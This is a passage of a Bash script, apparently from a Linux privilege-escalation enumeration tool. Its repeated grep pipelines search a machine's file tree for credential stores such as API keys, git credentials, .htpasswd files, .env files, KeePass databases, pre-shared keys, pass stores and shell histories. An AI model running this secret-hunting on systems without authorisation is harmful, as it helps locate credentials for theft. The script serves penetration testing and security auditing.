  PSTORAGE_FASTCGI=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "fastcgi_params$" | sort | uniq | head -n 70)
  PSTORAGE_FAT_FREE=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "fat\.config$" | sort | uniq | head -n 70)
  PSTORAGE_SHODAN=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "api_key$" | sort | uniq | head -n 70)
  PSTORAGE_CONCOURSE=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}concourse-keys|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}concourse-auth|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.flyrc$|concourse-auth$|concourse-keys$" | sort | uniq | head -n 70)
  PSTORAGE_BOTO=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.boto$" | sort | uniq | head -n 70)
  PSTORAGE_SNMP=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "snmpd\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_PYPIRC=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.pypirc$" | sort | uniq | head -n 70)
  PSTORAGE_POSTFIX=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "postfix$" | sort | uniq | head -n 70)
  PSTORAGE_CLOUDFLARE=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.cloudflared$" | sort | uniq | head -n 70)
  PSTORAGE_HISTORY=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*_history.*$" | sort | uniq | head -n 70)
  PSTORAGE_HTTP_CONF=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "httpd\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_HTPASSWD=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.htpasswd$" | sort | uniq | head -n 70)
  PSTORAGE_LDAPRC=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.ldaprc$" | sort | uniq | head -n 70)
  PSTORAGE_ENV=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E 'example' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.env.*$" | sort | uniq | head -n 70)
  PSTORAGE_MSMTPRC=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.msmtprc$" | sort | uniq | head -n 70)
  PSTORAGE_INFLUXDB=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "influxdb\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_ZABBIX=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "zabbix_server\.conf$|zabbix_agentd\.conf$|zabbix$" | sort | uniq | head -n 70)
  PSTORAGE_GITHUB=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.github$|\.gitconfig$|\.git-credentials$|\.git$" | sort | uniq | head -n 70)
  PSTORAGE_SVN=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.svn$" | sort | uniq | head -n 70)
  PSTORAGE_KEEPASS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.kdbx$|KeePass\.config.*$|KeePass\.ini$|KeePass\.enforced.*$" | sort | uniq | head -n 70)
  PSTORAGE_PRE_SHARED_KEYS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.psk$" | sort | uniq | head -n 70)
  PSTORAGE_PASS_STORE_DIRECTORIES=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.password-store$" | sort | uniq | head -n 70)
